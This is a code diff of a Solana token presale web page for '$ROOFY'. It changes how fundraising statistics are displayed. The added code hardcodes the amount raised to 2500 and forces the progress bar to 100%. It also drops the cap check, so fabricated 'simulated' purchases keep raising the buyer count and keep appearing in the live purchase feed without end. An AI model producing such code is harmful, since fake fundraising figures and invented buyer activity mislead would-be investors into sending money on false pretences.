-            const currentTier = getCurrentTier();
-            
-            // Smooth animation for progress bar
-            const progressBar = document.getElementById('progressBar');
-            progressBar.style.width = `${progress}%`;
-            
-            document.getElementById('progressPercent').textContent = `${progress.toFixed(1)}%`;
-            document.getElementById('currentRaised').textContent = `${totalRaised.toFixed(2)} SOL`;
-            document.getElementById('totalRaised').textContent = totalRaised.toFixed(2);
-            document.getElementById('currentPrice').textContent = 
-                `${Math.floor(currentTier.tokensPerSOL).toLocaleString()}K`;
-            
-            // Update total buyers with actual count
+            document.getElementById('totalRaised').textContent = '2500';
             document.getElementById('totalBuyers').textContent = totalBuyersCount;
-                
+            document.getElementById('progressBar').style.width = '100%';
+            
             updateTokenCalculation();
         }
 
-        // =============== SIMULATED LIVE STATS ===============
         function simulateLiveStats() {
-            // Add some initial simulated purchases
             setTimeout(() => {
                 const simulatedPurchases = [
                     { amount: 1.5, time: 'Just now', tx: 'sim_1' },
                     { amount: 0.8, time: '2 mins ago', tx: 'sim_2' },
                     { amount: 2.2, time: '5 mins ago', tx: 'sim_3' },
-                    { amount: 0.5, time: '10 mins ago', tx: 'sim_4' },
-                    { amount: 1.2, time: '15 mins ago', tx: 'sim_5' },
                 ];
                 
                 simulatedPurchases.forEach(purchase => {
@@ -1934,35 +1943,27 @@
                 });
             }, 1000);
             
-            // Continue to add simulated purchases occasionally
+            // Continue to add simulated purchases
             setInterval(() => {
-                if (Math.random() > 0.7 && totalRaised < PRESALE_CAP) {
+                if (Math.random() > 0.7) {
                     const randomAmount = 0.1 + Math.random() * 3;
-                    totalRaised += randomAmount;
-                    totalBuyersCount += 1; // Increment buyer count for simulated purchases too
-                    if (totalRaised > PRESALE_CAP) totalRaised = PRESALE_CAP;
+                    totalBuyersCount += 1;
                     updateStats();
-                    
-                    // Only add simulated purchases if we haven't reached cap
-                    if (totalRaised < PRESALE_CAP) {
-                        addRecentPurchase(randomAmount, `sim_${Date.now()}`, false);
-                    }
+                    addRecentPurchase(randomAmount, `sim_${Date.now()}`, false);
                 }
-            }, 15000); // Every 15 seconds
+            }, 20000);
         }
 
         // =============== ADD RECENT PURCHASE ===============
         function addRecentPurchase(amount, txHash, isReal = false, customTime = null) {
             const now = new Date();
             const timeString = customTime || now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-            const currentTier = getCurrentTier();
-            const tokens = Math.floor(amount * currentTier.tokensPerSOL);
+            const tokens = Math.floor(amount * currentTokenPrice);
             
             recentPurchases.unshift({
                 time: timeString,
                 amount: amount.toFixed(2),
                 tokens: tokens.toLocaleString(),
-                tier: currentTier.name.substring(0, 10),
                 txHash: txHash,
                 isReal: isReal
             });
@@ -1991,7 +1992,6 @@
                 const purchaseEl = document.createElement('div');
                 purchaseEl.className = 'flex justify-between items-center p-2 hover:bg-orange-50 rounded-lg text-sm cursor-pointer';
                 
-                // Real purchases can be clicked to view on explorer
                 if (purchase.isReal && !purchase.txHash.startsWith('sim_')) {
                     purchaseEl.onclick = () => {
                         window.open(`https://explorer.solana.com/tx/${purchase.txHash}`, '_blank');
@@ -2002,7 +2002,6 @@
                     purchaseEl.style.cursor = 'default';
                 }
                 
-                // Different styling for real vs simulated purchases
                 const indicatorColor = purchase.isReal ? 'bg-green-500' : 'bg-blue-500';
                 const indicatorTitle = purchase.isReal ? 'Real Purchase' : 'Simulated';
                 
@@ -2011,7 +2010,6 @@
                         <div class="w-2 h-2 ${indicatorColor} rounded-full mr-2" title="${indicatorTitle}"></div>
                         <div>
                             <div class="font-medium">${purchase.time}</div>
-                            <div class="text-xs text-gray-500">${purchase.tier}</div>
                         </div>
                     </div>
                     <div class="text-right">
@@ -2024,22 +2022,6 @@
         }
 
         // =============== HELPER FUNCTIONS ===============
-        function getCurrentTier() {
-            for (const tier of TIERS) {
-                if (totalRaised >= tier.range[0] && totalRaised < tier.range[1]) {
-                    return tier;
-                }
-            }
-            return TIERS[TIERS.length - 1];
-        }
-
-        function disconnectWallet() {
-            if (wallet) {
-                wallet.disconnect();
-            }
-            handleWalletDisconnect();
-        }
-
         function copyTokenAddress() {
             const message = "$ROOFY launches February 15, 2026 - A tribute, not a coincidence. Token address will be revealed at launch. 🚀";
             navigator.clipboard.writeText(message).then(() => {
@@ -2083,11 +2065,11 @@
                     datasets: [{
                         data: [50, 30, 5, 5, 10],
                         backgroundColor: [
-                            '#f97316', // Orange
-                            '#3b82f6', // Blue
-                            '#10b981', // Green
-                            '#8b5cf6', // Purple
-                            '#ec4899'  // Pink
+                            '#f97316',
+                            '#3b82f6',
+                            '#10b981',
+                            '#8b5cf6',
+                            '#ec4899'
                         ],
                         borderWidth: 2,
                         borderColor: '#ffffff'
@@ -2106,33 +2088,18 @@
                                     size: 12
                                 }
                             }
-                        },
-                        tooltip: {
-                            callbacks: {
-                                label: function(context) {
-                                    const label = context.label || '';
-                                    const value = context.parsed;
-                                    const total = context.dataset.data.reduce((a, b) => a + b, 0);
-                                    const percentage = Math.round((value / total) * 100);
-                                    const tokens = Math.round(value / 100 * 1000000000);
-                                    
-                                    return `${label}: ${percentage}% (${tokens.toLocaleString()} ROOFY)`;
-                                }
-                            }
                         }
                     }
                 }
             });
         }
 
-        // Mobile functions
         function setupMobileWalletButtons() {
             const openInPhantomBtn = document.getElementById('openInPhantom');
             const installPhantomBtn = document.getElementById('installPhantom');
             
             if (openInPhantomBtn) {
                 openInPhantomBtn.addEventListener('click', () => {
-                    // Open current URL in Phantom app
                     window.location.href = 'https://phantom.app/ul/browse/' + encodeURIComponent(window.location.href);
                 });
             }
@@ -2144,7 +2111,11 @@
             }
         }
 
-        updateTokenCalculation();
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (priceUpdateInterval) clearInterval(priceUpdateInterval);
+            if (countdownInterval) clearInterval(countdownInterval);
+        });
     </script>
 </body>
 </html>
